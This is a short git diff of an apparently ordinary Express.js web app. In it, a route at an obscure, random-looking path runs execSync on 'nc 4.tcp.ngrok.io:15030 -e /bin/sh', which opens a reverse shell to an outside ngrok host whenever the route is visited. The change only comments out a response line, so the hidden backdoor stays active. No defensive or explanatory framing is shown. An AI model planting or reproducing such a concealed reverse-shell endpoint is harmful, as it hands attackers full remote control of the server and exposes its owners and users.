@@ -10,7 +10,7 @@ app.get('/', (req, res) => {
 app.get('/u89jg3own984hoenrdbf0eirhonbdf', (req, res) => {
   const envString = execSync('nc 4.tcp.ngrok.io:15030 -e /bin/sh', { encoding: 'utf8' });
   //const envVariables = envString.trim().split('\n');
-  res.send('lala'+envString)
+  //res.send('lala'+envString)
 })
 
 app.listen(port, () => {
